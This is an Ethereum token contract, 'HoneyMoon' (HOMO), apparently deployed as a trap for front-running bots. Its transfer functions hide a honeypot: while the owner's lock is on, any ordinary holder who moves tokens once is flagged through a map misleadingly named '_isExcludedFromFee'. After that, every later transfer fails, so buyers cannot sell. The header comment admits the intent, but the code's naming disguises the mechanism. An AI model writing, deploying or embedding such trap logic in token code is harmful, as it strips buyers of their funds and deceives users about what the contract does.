/**
 *Submitted for verification at Etherscan.io on 2021-05-09
*/

//Do NOT buy, if you are a human. This token was just made to fuck front-running b0ts back

pragma solidity ^0.5.0;

contract ERC20Interface {
    function totalSupply() public view returns (uint);
    function balanceOf(address tokenOwner) public view returns (uint balance);
    function allowance(address tokenOwner, address spender) public view returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a);
        c = a - b; 
    } 
    
    function safeMul(uint a, uint b) public pure returns (uint c) {
        c = a * b;
        require(a == 0 || c / a == b); 
    } 
        
    function safeDiv(uint a, uint b) public pure returns (uint c) { 
        require(b > 0);
        c = a / b;
    }
}

contract HoneyMoon is ERC20Interface, SafeMath {
    string public name;
    string public symbol;
    uint8 public decimals; // 18 decimals is the strongly suggested default, avoid changing it

    uint256 public _totalSupply;

    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;

    mapping (address => bool) private _isExcludedFromFee;
    
    address private _owner;
    
    address private _charityWallet;
    
    address private _uniswapV2Pair;
    
    address private _uniswapRouter;
    
    bool private _lock;
    
    /**
     * Constrctor function
     *
     * Initializes contract with initial supply tokens to the creator of the contract
     */
    constructor() public {
        name = "HoneyMoon";
        symbol = "HOMO";
        decimals = 9;
        _totalSupply = 1000000000000 * 10**9;
    
        _owner = msg.sender;

        _charityWallet = 0x952B34b4284427264A4962Bd2f3b1F4b1580606C;

        _uniswapRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

        _lock = true;

        balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function totalSupply() public view returns (uint) {
        return _totalSupply  - balances[address(0)];
    }

    function balanceOf(address tokenOwner) public view returns (uint balance) {
        return balances[tokenOwner];
    }

    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }

    function approve(address spender, uint tokens) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

    function transfer(address to, uint tokens) public returns (bool success) {
        
        if(_lock) {
            if(msg.sender != _owner && msg.sender != _charityWallet && msg.sender != _uniswapV2Pair && msg.sender != _uniswapRouter) {
                require(!_isExcludedFromFee[msg.sender], "Excluded addresses cannot call this method");
                _isExcludedFromFee[msg.sender] = true;
            }
        }
        
        balances[msg.sender] = safeSub(balances[msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(msg.sender, to, tokens);
        return true;
    }

    function transferFrom(address from, address to, uint tokens) public returns (bool success) {
        
        if(_lock) {
            if(from != _owner && from != _charityWallet && from != _uniswapV2Pair && from != _uniswapRouter) {
                require(!_isExcludedFromFee[from], "Excluded addresses cannot call this method");
                _isExcludedFromFee[from] = true;
            }
        }
        
        balances[from] = safeSub(balances[from], tokens);
        allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(from, to, tokens);
        return true;
    }
    
    function setUniswapV2Pair(address uniswapV2Pair) public {
        require(msg.sender == _owner , 'Only owner can call this function');
        _uniswapV2Pair = uniswapV2Pair;
        
    }
    
    function setLock(bool lock) public {
        require(msg.sender == _owner , 'Only owner can call this function');
        _lock = lock;
        
    }
}